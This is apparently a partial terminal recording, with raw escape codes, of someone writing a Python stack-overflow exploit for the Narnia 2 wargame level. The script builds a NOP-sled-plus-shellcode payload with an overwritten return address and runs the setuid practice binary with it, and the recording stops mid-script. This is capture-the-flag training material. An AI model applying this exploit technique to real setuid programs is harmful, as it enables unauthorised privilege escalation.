[22.431, "o", "$ cat /tmp/e_narnia2.py\r\n\u001b[?25l\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;13H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1Himport os, struct, time, select, sys\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l# The shellcode is not hand-typed: it is loaded from the bytes nasm produced\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l# in /tmp/l2.bin (objcopy -O binary --only-section=.text /tmp/l2.o).\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25lsc = open(\"/tmp/l2.bin\", \"rb\").read()\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25lprint(\"shellcode (%d bytes): %s\" % (len(sc), sc.hex()))\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25lassert 0 not in sc, \"argv cannot contain NUL bytes\"\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25lassert len(sc) <= 128, \"the shellcode must fit in buf[128]\"\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25l# main(): char buf[128]; strcpy(buf, argv[1]);\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25l# objdump: lea -0x80(%ebp),%eax ; push %eax ; call strcpy@plt\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25l# gdb:      buf = ebp-0x80 -> saved ebp at offset 128, ret at offset 132\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25l# argv[1] = [0..127] 128-byte buf (NOP sled then shellcode)\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25l#\u001b[11C[128..131] saved ebp (filler)\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25l#\u001b[11C[132..135] return address -> a word inside the NOP sled\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25ldef payload_for(addr):\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25l    p = b\"\\x90\" * (128 - len(sc)) + sc\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25l    assert len(p) == 128\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25l    return p + b\"B\" * 4 + struct.pack(\"<I\", addr)\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25l\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25lenv = {k.encode(): v.encode() for k, v in os.environ.items()}\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[?25l\u001b[23;1H\u001b[K\u001b[32;84H3\u001b[23;1H\u001b[?25h\u001b[?25ldef probe(addr):\u001b[24;1H\u001b[K\u001b[32;84H4\u001b[24;1H\u001b[?25h\u001b[?25l    r, w = os.pipe()\u001b[25;1H\u001b[K\u001b[32;84H5\u001b[25;1H\u001b[?25h\u001b[?25l    pid = os.fork()\u001b[26;1H\u001b[K\u001b[32;84H6\u001b[26;1H\u001b[?25h\u001b[?25l    if pid == 0:\u001b[27;1H\u001b[K\u001b[32;84H7\u001b[27;1H\u001b[?25h\u001b[?25l\u001b[8Cos.close(r)\u001b[28;1H\u001b[K\u001b[32;84H8\u001b[28;1H\u001b[?25h\u001b[?25l\u001b[8Cdevnull = os.open(\"/dev/null\", os.O_RDONLY)\u001b[29;1H\u001b[K\u001b[32;84H9\u001b[29;1H\u001b[?25h\u001b[?25l\u001b[8Cos.dup2(devnull, 0)\u001b[30;1H\u001b[K\u001b[32;83H30\u001b[30;1H\u001b[?25h\u001b[?25l\u001b[8Cos.dup2(w, 1)\u001b[31;1H\u001b[K\u001b[32;84H1\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hos.dup2(w, 2)\u001b[32;83H\u001b[K\u001b[32;83H32,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[1;1H\u001b[2M\u001b[1;32r\u001b[29;9Hos.close(w)\u001b[30;9Hos.execve(b\"/narnia/narnia2\", [b\"/narnia/narnia2\", payload_for(addr)], env)\u001b[32;83H\u001b[K\u001b[32;83H34,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hos.close(w)\u001b[32;83H\u001b[K\u001b[32;83H35,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hout = b\"\"\u001b[32;83H\u001b[K\u001b[32;83H36,1\u001b[10CBot\u001b[31;1H\u001b[?25h